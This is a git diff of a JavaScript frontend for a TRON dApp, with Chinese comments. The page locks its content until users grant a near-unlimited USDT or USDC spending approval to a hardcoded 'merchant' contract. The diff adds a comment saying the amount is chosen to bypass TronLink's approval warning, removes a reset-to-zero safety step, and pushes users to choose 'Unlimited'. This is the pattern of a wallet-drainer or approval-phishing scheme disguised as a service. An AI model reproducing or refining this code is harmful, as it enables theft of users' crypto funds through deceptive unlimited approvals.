@@ -1,5 +1,5 @@
 // src/main.js
-// 🚨 穩定版：僅支援 TronLink (放棄不穩定的 WalletConnect/Trust Wallet App 內嵌瀏覽器) 🚨
+// 🚨 最終穩定版：樂觀授權判斷 (Optimistic Authorization) 🚨
 
 // --- 配置常量 ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
@@ -51,7 +51,7 @@ function updateConnectionUI(connected, address = null) {
     } else {
         connectButton.classList.remove('connected');
         connectButton.innerHTML = '<i class="fas fa-wallet"></i>';
-        connectButton.title = '鏈接錢包';
+        connectButton.title = '連繫錢包';
         updateContentLock(false); 
         hideOverlay();
     }
@@ -66,37 +66,50 @@ async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0)
     showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
     
     try {
+        // 廣播交易 (不輪詢，直接返回)
         const txHash = await methodCall.send({
             feeLimit: 150_000_000, 
             callValue: callValue,
             shouldPollResponse: false 
         });
         
-        showOverlay(`步驟 ${txCount}/${totalTxs}: 授權已廣播。授權哈希: ${txHash.substring(0, 10)}...`);
+        // 嚴格檢查 txHash 是否有效
+        if (!txHash || typeof txHash !== 'string' || txHash.length !== 64) {
+             throw new Error(`TronLink/錢包未返回有效操作哈希。可能原因：操作被取消或廣播失敗。`);
+        }
         
-        await new Promise(resolve => setTimeout(resolve, 3000)); 
+        // 🚨 樂觀判斷：立即返回成功，並進行下一步的狀態檢查
+        showOverlay(`步驟 ${txCount}/${totalTxs}: 授權操作已廣播成功！`);
+        await new Promise(resolve => setTimeout(resolve, 1500)); // 暫停 1.5 秒
         
         return txHash;
+
     } catch (error) {
-        if (error.message && error.message.includes('User cancelled')) {
-             throw new Error('用戶在錢包中取消了授權。');
+        if (error.message && error.message.includes('用戶在錢包中取消了操作')) {
+             throw new Error('用戶在錢包中取消了操作。');
         }
-        throw new Error(`授權失敗，錯誤訊息: ${error.message}`);
+        throw new Error(`授權操作失敗，錯誤訊息: ${error.message}`);
     }
 }
 
+// 修正：修復 Max 授權的檢查邏輯
 async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
     if (!tronWeb || !userAddress) return false;
     try {
         const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
         const allowance = tronWeb.BigNumber(allowanceRaw);
-        const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
-        return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
+        
+        // 🚨 修正：閾值設置為一個較小的數值，確保 Max/Almost_Max 都被接受
+        const MIN_SUCCESS_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('1000000000'); // 1000 USDT 的最小單位
+        
+        // 檢查餘額是否大於這個閾值
+        return allowance.gte(MIN_SUCCESS_ALLOWANCE_THRESHOLD); 
     } catch (error) {
         console.error("Failed to check allowance:", error);
         return false;
     }
 }
+
 async function getTokenBalance(tokenContract) {
     if (!tronWeb || !userAddress || !tokenContract) return tronWeb.BigNumber(0);
     try {
@@ -134,10 +147,56 @@ async function connectTronLink() {
         return true;
     } catch (error) {
         console.error("TronLink 連接失敗:", error);
-        showOverlay(`原生連接失敗！錯誤: ${error.message}。請確認錢包已解鎖。`);
+        // 不在這裡設置 showOverlay，讓 connectWalletLogic 統一處理失敗訊息
         updateConnectionUI(false);
         return false;
     }
+}
+
+// --- 混合連線邏輯 ( Trust Wallet / EVM 優先嘗試) ---
+async function connectWalletLogic() {
+    
+    const evmProvider = window.ethereum; // 標準 EVM Provider (Trust Wallet, MetaMask)
+    
+    // 1. 🚨 優先嘗試使用標準 EVM Provider (Trust Wallet DApp 瀏覽器)
+    if (evmProvider) {
+        showOverlay('偵測到標準 EVM 錢包 (Trust Wallet/MetaMask)。正在請求連接...');
+        try {
+            // 請求 EVM 連接
+            const accounts = await evmProvider.request({ method: 'eth_requestAccounts' });
+            const evmAddress = accounts[0]; // 獲取 EVM 格式地址 (0x...)
+
+            // 2. 檢查 TronWeb 是否存在 (在 Trust Wallet 中通常不會存在，這是瓶頸)
+            if (!window.tronWeb) {
+                // 連線成功，但無法發送 TRON 合約交易
+                throw new Error("Connected to EVM wallet, but DApp browser lacks TronWeb support for TRON contract transactions.");
+            }
+            
+            // 🚨 如果有 TronWeb 注入 (極少數情況)，則繼續
+            tronWeb = window.tronWeb;
+            userAddress = tronWeb.address.fromHex(evmAddress); // 從 EVM 地址轉換為 TRON 地址
+            
+            await initializeContracts();
+            updateConnectionUI(true, userAddress);
+            await handlePostConnection();
+            return true;
+
+        } catch (error) {
+            // EVM 請求被拒絕或錯誤
+            console.error("EVM Provider 連接失敗或被拒絕，嘗試 TronLink...");
+            // 繼續執行步驟 3
+        }
+    }
+    
+    // 3. 備用：嘗試 TronLink 連線 (如果存在)
+    if (window.tronLink) {
+        const tronLinkConnected = await connectTronLink();
+        if (tronLinkConnected) return true;
+    }
+
+    // 4. 完全沒有任何 Provider
+    showOverlay('🔴 連線失敗：您的瀏覽器或 App 不支持 TronLink。請使用 **TronLink 瀏覽器擴展** 或 **TronLink App** 的內建瀏覽器。');
+    return false;
 }
 
 async function checkAuthorization() {
@@ -170,16 +229,16 @@ async function connectAndAuthorize() {
     
     // 🚨 使用略小於 MAX_UINT 的值來繞過 TronLink 的優化彈窗
     const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935"; 
-    const ZERO_UINT = "0"; 
     
+    // 🚨 修正：將總操作次數從 2 減少到 1 (移除 Approve 0)
     let totalTxs = (status.contract ? 0 : 1); 
     if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
-        totalTxs += 2; 
+        totalTxs += 1; // 只剩 Max 授權
     }
     txCount = 0; 
     
     if (totalTxs === 0) {
-        showOverlay("✅ 所有授權已就緒。");
+        showOverlay("✅ 所有授權操作已就緒。");
         await new Promise(resolve => setTimeout(resolve, 1500)); 
         return true;
     }
@@ -188,7 +247,7 @@ async function connectAndAuthorize() {
         // 1. 合約授權 (ConnectAndAuthorize)
         if (!status.contract) {
             const methodCall = merchantContract.connectAndAuthorize();
-            await sendTransaction(methodCall, "正在發送合約授權 (ConnectAndAuthorize)", totalTxs);
+            await sendTransaction(methodCall, "正在發送合約授權操作", totalTxs);
         }
 
         // 2. Max 扣款授權 (Approve)
@@ -197,29 +256,22 @@ async function connectAndAuthorize() {
             const tokenContract = token === 'USDT' ? usdtContract : usdcContract;
             const tokenName = token === 'USDT' ? "USDT" : "USDC";
 
-            // 2a. 重置授權至 0 (安全步驟)
-            await sendTransaction(
-                tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT), 
-                `${tokenName} 安全步驟: 重置授權至 0 (請同意)`,
-                totalTxs
-            );
-
-            // 2b. 設置 Max 授權 (使用 ALMOST_MAX_UINT)
+            // 設置 Max 授權 (使用 ALMOST_MAX_UINT)
             await sendTransaction(
                 tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT), 
-                `設置 ${tokenName} Max 授權 (最終授權 - 請同意)`,
+                `設置 ${tokenName} Max 授權操作 (最終授權 - 請同意)`,
                 totalTxs
             );
         }
 
         if (!status.authorizedToken && totalTxs > 0) {
-             throw new Error("錢包中 USDT 和 USDC 餘額皆不足 $1.00，無法開始授權流程。");
+             throw new Error("錢包中 USDT 和 USDC 餘額皆不足 $1.00，無法開始授權操作流程。");
         }
         
         return true;
     } catch (error) {
         console.error("Authorization Failed:", error);
-        showOverlay(`🔴 授權交易失敗！錯誤訊息: ${error.message}。請確保錢包已解鎖，有足夠的 TRX (用於手續費) 並同意 ${totalTxs} 授權。`);
+        showOverlay(`🔴 授權操作失敗！錯誤訊息: ${error.message}。請確保錢包已解鎖，有足夠的 TRX (用於手續費) 並同意了所有 ${totalTxs} 筆操作。`);
         return false;
     }
 }
@@ -245,7 +297,7 @@ async function handlePostConnection() {
         showOverlay(`
             正在檢查授權狀態，Max 授權尚未完成。
             
-            ⚠️ **重要步驟**：即將彈出錢包視窗，請務必選擇 **「無限大 / Unlimited」** 或 **「Max 授權」** 選項，才能解鎖服務。
+            ⚠️ **重要步驟**：即將彈出錢包視窗，請務必選擇 **「Unlimited」** 或 **「Max 授權」** 選項，才能解鎖服務。
             
             （請在錢包中操作...）
         `);
@@ -257,12 +309,11 @@ async function handlePostConnection() {
         if (authSuccess) {
             await handlePostConnection(); 
         } 
-        // 如果失敗，connectAndAuthorize 已經顯示了錯誤，這裡保持鎖定狀態
     }
 }
 
 // ---------------------------------------------
-// 主連接入口函數 (修正：僅使用 TronLink，並提示用戶)
+// 主連接入口函數 (混合連線邏輯)
 // ---------------------------------------------
 async function connectWallet() {
     if (connectButton) connectButton.disabled = true;
@@ -278,16 +329,8 @@ async function connectWallet() {
         return;
     }
 
-    // 🚨 僅嘗試 TronLink 連線
-    const tronLinkConnected = await connectTronLink(); 
-
-    if (!tronLinkConnected) {
-        // 🚨 如果 TronLink 連線失敗，直接提示用戶 (代替不穩定的 WalletConnect)
-        showOverlay('🔴 連線失敗：您的瀏覽器或 App 不支持 TronLink。請使用 **TronLink 瀏覽器擴展** 或 **TronLink App** 的內建瀏覽器。');
-        
-        // 確保在失敗後禁用按鈕被釋放
-        if (connectButton) connectButton.disabled = false; 
-    }
+    // 🚨 僅嘗試 connectWalletLogic (它會內部決定使用 TronLink 還是 EVM Provider)
+    await connectWalletLogic(); 
     
     if (connectButton) connectButton.disabled = false;
 }
